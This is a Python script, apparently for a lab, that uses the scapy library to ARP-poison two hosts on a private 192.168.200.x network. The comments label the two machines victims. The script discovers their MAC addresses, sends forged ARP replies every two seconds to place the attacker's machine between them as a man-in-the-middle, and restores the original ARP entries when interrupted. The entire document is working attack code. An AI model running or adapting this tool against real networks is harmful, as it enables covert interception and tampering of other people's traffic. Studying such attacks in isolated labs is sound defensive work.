#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp, sr, get_if_hwaddr
import time
import sys

# Define IP addresses for two victims
victimA_ip = "192.168.200.10"
victimB_ip = "192.168.200.11"
interface = "eth0"

# Get the attacker's MAC address
attacker_mac = get_if_hwaddr(interface)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    answered, _ = sr(arp_request, timeout=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

# Get victim MACs
victimA_mac = get_mac(victimA_ip)
victimB_mac = get_mac(victimB_ip)

if victimA_mac is None or victimB_mac is None:
    print("Failed to obtain MAC address for one or both victims.")
    sys.exit(1)

print(f"Victim A MAC: {victimA_mac}")
print(f"Victim B MAC: {victimB_mac}")
print(f"Attacker MAC: {attacker_mac}")
print("Starting ARP poisoning for direct victim-to-victim MITM. Press CTRL+C to stop.")

def poison(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = Ether(dst=target_mac) / arp_response
    sendp(packet, iface=interface, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac):
    arp_response = ARP(op=2, pdst=target_ip, psrc=real_ip, hwsrc=real_mac)
    packet = Ether(dst=target_mac) / arp_response
    sendp(packet, iface=interface, count=5, verbose=False)

try:
    while True:
        poison(victimA_ip, victimA_mac, victimB_ip)
        poison(victimB_ip, victimB_mac, victimA_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL+C! Restoring network...")
    restore(victimA_ip, victimA_mac, victimB_ip, victimB_mac)
    restore(victimB_ip, victimB_mac, victimA_ip, victimA_mac)
    print("Network restored. Exiting.")
